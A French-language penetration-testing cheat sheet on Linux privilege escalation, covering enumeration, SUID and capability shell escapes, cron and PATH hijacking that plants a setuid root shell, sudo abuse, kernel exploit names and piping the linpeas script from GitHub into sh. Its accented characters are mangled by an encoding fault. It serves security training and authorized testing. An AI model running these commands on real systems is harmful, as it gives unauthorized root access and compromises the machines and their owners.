# Linux Privilege Escalation - Guide Complet

## üóÇÔ∏è Workflow d'escalade de privil√®ges Linux
1. √ânum√©ration syst√®me et utilisateur (id, uname, ps, netstat)
   ‚Üì
2. Recherche de binaires SUID/SGID et capabilities (find, getcap)
   ‚Üì
3. V√©rification des t√¢ches cron et services (crontab, systemctl)
   ‚Üì
4. Analyse des permissions et configurations (sudo -l, world-writable)
   ‚Üì
5. Exploitation des vuln√©rabilit√©s kernel ou applications
   ‚Üì
6. √âl√©vation vers root et persistance

## üìã Vue d'ensemble

L'escalade de privil√®ges Linux consiste √† passer d'un utilisateur standard √† root (UID 0) en exploitant des mauvaises configurations, des vuln√©rabilit√©s ou des erreurs d'impl√©mentation.

> **üí° Explication Simple** : C'est comme partir d'employ√© et devenir PDG de l'entreprise en trouvant des failles dans l'organisation ou des portes d√©rob√©es laiss√©es ouvertes.

## üîç √ânum√©ration Initiale

### Informations syst√®me de base
```bash
# Informations utilisateur
id                              # UID, GID, groupes
whoami                          # Nom utilisateur actuel
groups                          # Groupes de l'utilisateur
sudo -l                         # Permissions sudo

# Informations syst√®me
uname -a                        # Version kernel
cat /etc/os-release            # Distribution
cat /proc/version              # Version d√©taill√©e
lscpu                          # Architecture CPU
cat /proc/cpuinfo              # D√©tails CPU
```

### Processus et services
```bash
# Processus en cours
ps aux                         # Tous les processus
ps -ef                         # Arbre des processus
pstree                         # Arbre visuel

# Services et sockets
systemctl list-units --type=service
ss -tlnp                       # Ports TCP ouverts
netstat -tlnp                  # Ports r√©seau (si disponible)
lsof -i                        # Fichiers ouverts r√©seau
```

### Utilisateurs et groupes
```bash
# Utilisateurs syst√®me
cat /etc/passwd                # Tous les utilisateurs
cat /etc/group                 # Tous les groupes
w                              # Utilisateurs connect√©s
last                           # Derni√®res connexions
cat /etc/sudoers               # Configuration sudo (si lisible)
```

## üîë Binaires SUID/SGID

### Recherche de binaires SUID
```bash
# Binaires SUID (s'ex√©cutent avec droits propri√©taire)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Binaires SGID (s'ex√©cutent avec droits groupe)
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Combinaison SUID et SGID
find / -perm -6000 -type f 2>/dev/null
```

### Exploitation de binaires SUID courants
```bash
# /bin/bash ou /bin/sh avec SUID
/bin/bash -p                   # Garde les privil√®ges
/bin/sh -p

# find avec SUID
find /etc/passwd -exec /bin/bash -p \;
find . -exec /bin/bash -p \; -quit

# vim/nano avec SUID
vim -c ':!/bin/bash'
vim -c ':set shell=/bin/bash' -c ':shell'

# awk avec SUID
awk 'BEGIN {system("/bin/bash -p")}'

# python avec SUID
python -c 'import os; os.system("/bin/bash -p")'
python -c 'import pty; pty.spawn("/bin/bash")'

# perl avec SUID
perl -e 'exec "/bin/bash";'
```

## üéØ Capabilities Linux

### Recherche de capabilities
```bash
# Lister toutes les capabilities
getcap -r / 2>/dev/null

# Capabilities communes dangereuses
# CAP_SETUID - Peut changer UID
# CAP_DAC_OVERRIDE - Bypass permissions fichiers
# CAP_SYS_ADMIN - Privil√®ges administrateur
```

### Exploitation via capabilities
```bash
# python avec cap_setuid
python -c "import os; os.setuid(0); os.system('/bin/bash')"

# tar avec cap_dac_override
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# node avec cap_setuid
node -e "process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: [0,1,2]})"
```

## ‚è∞ T√¢ches Cron et Services

### √ânum√©ration des t√¢ches cron
```bash
# T√¢ches cron syst√®me
cat /etc/crontab
ls -la /etc/cron*
crontab -l                     # T√¢ches utilisateur

# Monitoring des t√¢ches
# Installer pspy ou surveiller avec:
ps aux | grep -v "]"           # R√©p√©ter pour voir nouveaux processus
```

### Exploitation de t√¢ches cron
```bash
# Script cron world-writable
ls -la /path/to/cron/script
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/script

# PATH manipulation dans cron
# Si PATH non absolu dans crontab:
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/command
chmod +x /tmp/command
```

## üìÇ Permissions et Configurations

### Fichiers world-writable
```bash
# Fichiers modifiables par tous
find / -perm -o+w -type f 2>/dev/null
find / -perm -002 -type f 2>/dev/null

# R√©pertoires world-writable
find / -perm -o+w -type d 2>/dev/null

# Fichiers sans propri√©taire
find / -nouser -o -nogroup 2>/dev/null
```

### Configuration sudo dangereuse
```bash
# V√©rifier sudo -l pour:
# (ALL) NOPASSWD: ALL
# User_Alias avec privil√®ges
# Wildcards dangereux

# Exemples d'exploitation sudo
sudo -u root /bin/bash
sudo -u root su -

# GTFOBins pour binaires sudo
# Si sudo vim disponible:
sudo vim -c ':!/bin/bash'
```

## üêõ Vuln√©rabilit√©s Kernel

### Identification version kernel
```bash
uname -a
cat /proc/version
lsb_release -a

# Recherche d'exploits kernel
searchsploit kernel $(uname -r)
searchsploit ubuntu $(lsb_release -r | awk '{print $2}')
```

### Exploits kernel courants
```bash
# DirtyCow (CVE-2016-5195)
# Kernel 2.6.22 - 4.8.3

# Overlayfs (CVE-2015-1328)
# Ubuntu 12.04, 14.04, 14.10, 15.04

# RDS (CVE-2010-3904)
# Kernel <= 2.6.36-rc8

# V√©rifier avec exploit-suggester
./linux-exploit-suggester.sh
./linpeas.sh
```

## üîß Outils d'Automatisation

### LinPEAS
```bash
# T√©l√©chargement et ex√©cution
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Ou avec wget
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

### Linux Exploit Suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## üõ°Ô∏è Conseils OPSEC
- √âviter les exploits kernel sur les syst√®mes de production (risque de crash)
- Nettoyer les fichiers cr√©√©s apr√®s exploitation (/tmp/rootbash, etc.)
- Ne pas modifier les permissions de fichiers syst√®me sans autorisation
- Documenter toutes les techniques utilis√©es pour la reproductibilit√©
- Pr√©f√©rer les techniques non-destructives (capabilities vs exploits)

## ‚ö†Ô∏è Erreurs fr√©quentes
- Oublier de v√©rifier les capabilities Linux (m√©canisme r√©cent)
- Ne pas surveiller les nouveaux processus (t√¢ches cron intermittentes)
- Ignorer les variables d'environnement dans les scripts (PATH hijacking)
- Lancer des exploits kernel sans comprendre les risques
- Ne pas v√©rifier les groupes sp√©ciaux (docker, lxd, disk)

## üí° Astuces
- Utiliser pspy pour surveiller les processus sans privil√®ges root
- Combiner plusieurs outils d'√©num√©ration (linpeas + linenum + manuel)
- V√©rifier les groupes sp√©ciaux : docker (docker escape), lxd (lxd privesc)
- Chercher les cl√©s SSH priv√©es dans /home et /root
- Exploiter les services internes (MySQL, Redis) avec credentials par d√©faut

## üîó Pour aller plus loin
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20Privilege%20Escalation)
- [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

## üß≠ Navigation
- [Guide Windows Privilege Escalation](./Windows_Privilege_Escalation.md)
- [Guide √©num√©ration Linux](../../01-Enumeration/Syst√®mes/Linux_Enumeration.md)
- [Retour √† l'exploitation syst√®me](./README.md) 